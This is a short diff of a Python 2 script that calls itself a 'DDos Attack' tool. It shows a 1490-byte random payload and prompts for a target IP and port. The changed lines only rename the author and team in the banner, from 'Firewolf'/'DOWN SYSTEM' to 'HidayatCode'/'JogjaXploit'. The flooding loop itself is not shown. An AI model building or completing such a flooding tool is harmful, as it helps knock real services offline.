@@ -18,12 +18,12 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet Firewolf DDos Attack")
+os.system("figlet HidayatCode DDos Attack")
 print
-print "Author   : FIREWOLF"
-print "TEAM     : DOWN SYSTEM"
-print "Thanks   : All Member DOWN SYSTEM"
-print "Tingkat  : Newbie Berkarya"
+print "Author   : HidayatCode"
+print "TEAM     : JogjaXploit"
+print "Thanks   : All Member JogjaXploit "
+print "Tingkat  : Newbie Galau"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
